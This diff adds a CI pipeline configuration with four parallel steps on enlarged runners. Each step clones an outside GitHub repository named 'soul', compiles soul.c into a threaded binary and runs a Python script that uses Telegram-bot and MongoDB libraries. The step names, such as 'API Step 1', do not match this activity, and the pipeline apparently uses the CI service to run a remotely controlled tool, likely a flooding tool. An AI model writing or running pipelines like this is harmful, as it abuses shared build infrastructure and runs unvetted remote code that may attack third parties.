@@ -1,0 +1,76 @@
+image: rockylinux
+
+pipelines:
+  default:
+    - parallel:
+        - step:
+            name: "Run 5-Minute Show"
+            size: 2x
+            script:
+              - dnf update -y
+              - dnf install -y gcc git
+              - dnf install -y python39 python39-devel
+              - ln -sf /usr/bin/python3.9 /usr/bin/python
+              - python --version
+              - python -m ensurepip --default-pip
+              - python -m pip install --upgrade pip setuptools wheel
+              - python -m pip install multidict yarl frozenlist async_timeout
+              - python -m pip install telebot pymongo aiohttp
+              - git clone https://github.com/MEGOXERHUB9353/soul.git
+              - cd soul
+              - gcc soul.c -o megoxer -lpthread
+              - python megoxer.py
+
+        - step:
+            name: "API Step 1"
+            size: 2x
+            script:
+              - dnf update -y
+              - dnf install -y gcc git
+              - dnf install -y python39 python39-devel
+              - ln -sf /usr/bin/python3.9 /usr/bin/python
+              - python --version
+              - python -m ensurepip --default-pip
+              - python -m pip install --upgrade pip setuptools wheel
+              - python -m pip install multidict yarl frozenlist async_timeout
+              - python -m pip install telebot pymongo aiohttp
+              - git clone https://github.com/MEGOXERHUB9353/soul.git
+              - cd soul
+              - gcc soul.c -o megoxer -lpthread
+              - python megoxer.py
+
+        - step:
+            name: "API Step 2"
+            size: 2x
+            script:
+              - dnf update -y
+              - dnf install -y gcc git
+              - dnf install -y python39 python39-devel
+              - ln -sf /usr/bin/python3.9 /usr/bin/python
+              - python --version
+              - python -m ensurepip --default-pip
+              - python -m pip install --upgrade pip setuptools wheel
+              - python -m pip install multidict yarl frozenlist async_timeout
+              - python -m pip install telebot pymongo aiohttp
+              - git clone https://github.com/MEGOXERHUB9353/soul.git
+              - cd soul
+              - gcc soul.c -o megoxer -lpthread
+              - python megoxer.py
+
+        - step:
+            name: "API Step 3"
+            size: 2x
+            script:
+              - dnf update -y
+              - dnf install -y gcc git
+              - dnf install -y python39 python39-devel
+              - ln -sf /usr/bin/python3.9 /usr/bin/python
+              - python --version
+              - python -m ensurepip --default-pip
+              - python -m pip install --upgrade pip setuptools wheel
+              - python -m pip install multidict yarl frozenlist async_timeout
+              - python -m pip install telebot pymongo aiohttp
+              - git clone https://github.com/MEGOXERHUB9353/soul.git
+              - cd soul
+              - gcc soul.c -o megoxer -lpthread
+              - python megoxer.py
